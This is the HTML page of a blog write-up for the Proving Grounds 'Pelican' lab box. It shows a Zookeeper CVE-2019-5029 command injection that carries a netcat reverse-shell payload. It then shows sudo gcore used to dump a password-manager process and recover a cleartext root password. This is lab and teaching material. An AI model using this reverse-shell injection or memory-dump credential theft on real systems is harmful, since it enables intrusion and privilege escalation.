@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PG Practice - Pelican | Fabio Birnegger</title>
+<meta name="keywords" content="Proving Grounds Practice, Linux, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Intermediate
+      
+      
+          Type
+          Linux
+      
+  
+
+Port Scan
+└─$ nmap -sV -p- 192.168.208.98   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 &#43;0200
+Nmap scan report for 192.168.208.98
+Host is up (0.035s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+631/tcp   open  ipp         CUPS 2.2
+2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)
+8080/tcp  open  http        Jetty 1.0
+8081/tcp  open  http        nginx 1.14.2
+46295/tcp open  java-rmi    Java RMI
+Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Local.txt
+As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the Zookeeper Service running on port 2181 and the web-interface for it on port 8080. The running instance is vulnerable to CVE-2019-5029 for which there is a public exploit. After starting a netcat listener on my attacker machine, i carried out the exploit in the web-interface as follows:">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/pg_pelican/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.9b4f18f427ed299296009b0f14c130159f761d9d285109ab0e5db09488a51e86.css" integrity="sha256-m08Y9CftKZKWAJsPFMEwFZ92HZ0oUQmrDl2wlIilHoY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/pg_pelican/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/pg_pelican/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="PG Practice - Pelican">
+  <meta property="og:description" content="Box Details
+Difficulty Intermediate Type Linux Port Scan
+└─$ nmap -sV -p- 192.168.208.98 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 &#43;0200Nmap scan report for 192.168.208.98Host is up (0.035s latency).Not shown: 65526 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)631/tcp open ipp CUPS 2.22181/tcp open zookeeper Zookeeper 3.4.6-1569965 (Built on 02/20/2014)2222/tcp open ssh OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)8080/tcp open http Jetty 1.08081/tcp open http nginx 1.14.246295/tcp open java-rmi Java RMIService Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel Local.txt As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the Zookeeper Service running on port 2181 and the web-interface for it on port 8080. The running instance is vulnerable to CVE-2019-5029 for which there is a public exploit. After starting a netcat listener on my attacker machine, i carried out the exploit in the web-interface as follows:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-04-06T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-06T00:00:00+00:00">
+    <meta property="article:tag" content="Proving Grounds Practice">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Write-Up">
+    <meta property="og:image" content="http://localhost:1313/writeups/pg_pelican/images/writeup_screens/pg_pelican/pg_pelican_cover.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/pg_pelican/images/writeup_screens/pg_pelican/pg_pelican_cover.svg">
+<meta name="twitter:title" content="PG Practice - Pelican">
+<meta name="twitter:description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Intermediate
+      
+      
+          Type
+          Linux
+      
+  
+
+Port Scan
+└─$ nmap -sV -p- 192.168.208.98   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 &#43;0200
+Nmap scan report for 192.168.208.98
+Host is up (0.035s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+631/tcp   open  ipp         CUPS 2.2
+2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)
+8080/tcp  open  http        Jetty 1.0
+8081/tcp  open  http        nginx 1.14.2
+46295/tcp open  java-rmi    Java RMI
+Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Local.txt
+As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the Zookeeper Service running on port 2181 and the web-interface for it on port 8080. The running instance is vulnerable to CVE-2019-5029 for which there is a public exploit. After starting a netcat listener on my attacker machine, i carried out the exploit in the web-interface as follows:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PG Practice - Pelican",
+      "item": "http://localhost:1313/writeups/pg_pelican/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PG Practice - Pelican",
+  "name": "PG Practice - Pelican",
+  "description": "Box Details\nDifficulty Intermediate Type Linux Port Scan\n└─$ nmap -sV -p- 192.168.208.98 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 +0200\rNmap scan report for 192.168.208.98\rHost is up (0.035s latency).\rNot shown: 65526 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r631/tcp open ipp CUPS 2.2\r2181/tcp open zookeeper Zookeeper 3.4.6-1569965 (Built on 02/20/2014)\r2222/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r8080/tcp open http Jetty 1.0\r8081/tcp open http nginx 1.14.2\r46295/tcp open java-rmi Java RMI\rService Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel Local.txt As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the Zookeeper Service running on port 2181 and the web-interface for it on port 8080. The running instance is vulnerable to CVE-2019-5029 for which there is a public exploit. After starting a netcat listener on my attacker machine, i carried out the exploit in the web-interface as follows:\n",
+  "keywords": [
+    "Proving Grounds Practice", "Linux", "Write-Up"
+  ],
+  "articleBody": "Box Details\nDifficulty Intermediate Type Linux Port Scan\n└─$ nmap -sV -p- 192.168.208.98 Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 +0200\rNmap scan report for 192.168.208.98\rHost is up (0.035s latency).\rNot shown: 65526 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\r631/tcp open ipp CUPS 2.2\r2181/tcp open zookeeper Zookeeper 3.4.6-1569965 (Built on 02/20/2014)\r2222/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r8080/tcp open http Jetty 1.0\r8081/tcp open http nginx 1.14.2\r46295/tcp open java-rmi Java RMI\rService Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel Local.txt As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the Zookeeper Service running on port 2181 and the web-interface for it on port 8080. The running instance is vulnerable to CVE-2019-5029 for which there is a public exploit. After starting a netcat listener on my attacker machine, i carried out the exploit in the web-interface as follows:\n$(/bin/nc -e /bin/sh -i 192.168.45.155 80 \u0026)\nShortly after, i received a reverse shell as user charles and was able to read /home/charles/local.txt\nProof.txt First of all, we should run python3 -c 'import pty; pty.spawn(\"/bin/bash\")' in order to spawn an interactive TTY shell which is a lot more comfortable than the restricted shell we received per default. Next, we can check if we are able to run any commands with sudo permissions with $ sudo -l. This is indeed the case since the output shows that we can run usr/bin/gcore with sudo privileges without the need to supply a password for it:\nLooking for gcore in GTFOBins shows, that we can create core dumps from running processes with the binary. To list all running processes we can simply use $ ps aux. Looking through the processes, the following line catched my eye:\nroot 490 0.0 0.0 2276 72 ? Ss 18:07 0:00 /usr/bin/password-store There is a password-store process running which is a minimalistic password manager for Linux systems. This is very interesting so i ran the following commands to create a core dump of the process with gcore and printing the strings found in the dump:\n$ sudo gcore 490\r$ strings core.490 This prints a lot of output but if we scroll up a little bit we can find the following two lines:\n001 Password: root:\rClogKingpinInning731 This looks like the password for the root user in clear-text! Let’s try to spawn a root shell with the obtained password:\nIt worked and we can now read the flag /root/proof.txt.\n",
+  "wordCount" : "453",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/pg_pelican/images/writeup_screens/pg_pelican/pg_pelican_cover.svg","datePublished": "2026-04-06T00:00:00Z",
+  "dateModified": "2026-04-06T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/pg_pelican/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PG Practice - Pelican
+    </h1>
+    <div class="post-meta"><span title='2026-04-06 00:00:00 +0000 UTC'>April 6, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_pelican/pg_pelican_cover.svg" alt="PG Pelican Cover">
+        
+</figure>
+  <div class="post-content"><p><strong>Box Details</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Intermediate</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Linux</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Port Scan</strong></p>
+<pre tabindex="0"><code>└─$ nmap -sV -p- 192.168.208.98   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 00:12 +0200
+Nmap scan report for 192.168.208.98
+Host is up (0.035s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+631/tcp   open  ipp         CUPS 2.2
+2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+8080/tcp  open  http        Jetty 1.0
+8081/tcp  open  http        nginx 1.14.2
+46295/tcp open  java-rmi    Java RMI
+Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h2 id="localtxt">Local.txt<a hidden class="anchor" aria-hidden="true" href="#localtxt">#</a></h2>
+<p>As we can see in the port scan above, there are a lot of different services running on the target server. The most interesting one is the <strong>Zookeeper</strong> Service running on port <strong>2181</strong> and the web-interface for it on port <strong>8080</strong>. The running instance is vulnerable to <strong>CVE-2019-5029</strong> for which there is a <a href="https://x7331.gitbook.io/boxes/services/tcp/2181-zookeeper">public exploit</a>. After starting a <strong>netcat</strong> listener on my attacker machine, i carried out the exploit in the web-interface as follows:</p>
+<p><code>$(/bin/nc -e /bin/sh -i 192.168.45.155 80 &amp;)</code></p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_pelican/pg_pelican_web.png"></p>
+<p>Shortly after, i received a reverse shell as user <strong>charles</strong> and was able to read <em>/home/charles/local.txt</em></p>
+<hr>
+<h2 id="prooftxt">Proof.txt<a hidden class="anchor" aria-hidden="true" href="#prooftxt">#</a></h2>
+<p>First of all, we should run <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> in order to spawn an interactive <strong>TTY</strong> shell which is a lot more comfortable than the restricted shell we received per default. Next, we can check if we are able to run any commands with sudo permissions with <code>$ sudo -l</code>. This is indeed the case since the output shows that we can run <code>usr/bin/gcore</code> with sudo privileges without the need to supply a password for it:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_pelican/pg_pelican_sudol.png"></p>
+<p>Looking for <strong>gcore</strong> in <a href="https://gtfobins.org/gtfobins/gcore/">GTFOBins</a> shows, that we can create core dumps from running processes with the binary. To list all running processes we can simply use <code>$ ps aux</code>. Looking through the processes, the following line catched my eye:</p>
+<pre tabindex="0"><code>root       490  0.0  0.0   2276    72 ?        Ss   18:07   0:00 /usr/bin/password-store
+</code></pre><p>There is a password-store process running which is a minimalistic password manager for Linux systems. This is very interesting so i ran the following commands to create a core dump of the process with <strong>gcore</strong> and printing the strings found in the dump:</p>
+<pre tabindex="0"><code>$ sudo gcore 490
+
+$ strings core.490
+</code></pre><p>This prints a lot of output but if we scroll up a little bit we can find the following two lines:</p>
+<pre tabindex="0"><code>001 Password: root:
+ClogKingpinInning731
+</code></pre><p>This looks like the password for the root user in clear-text! Let&rsquo;s try to spawn a root shell with the obtained password:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_pelican/pg_pelican_root.png"></p>
+<p>It worked and we can now read the flag <em>/root/proof.txt</em>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/proving-grounds-practice/">Proving Grounds Practice</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/writeups/pg_twiggy/">
+    <span class="title">Next »</span>
+    <br>
+    <span>PG Practice - Twiggy</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
